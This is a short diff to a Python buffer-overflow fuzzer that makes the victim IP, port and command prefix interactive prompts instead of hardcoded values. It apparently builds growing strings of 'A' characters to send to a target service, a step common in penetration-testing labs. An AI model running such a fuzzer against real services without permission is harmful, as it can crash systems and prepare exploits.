@@ -3,11 +3,11 @@
 #BOF Fuzzer Modified
 import socket, time, sys
 #change this
-ip = "Victim IP"
+ip = input("Victim IP:")
 #change this
-port = "victim port(no quotes)"
+port = input("Port:")
 timeout = 5
-prefix = ""
+prefix = input("Enter Command:")
 #appends 100 A's to the end of the command each loop
 buffer = []
 bytes = 100
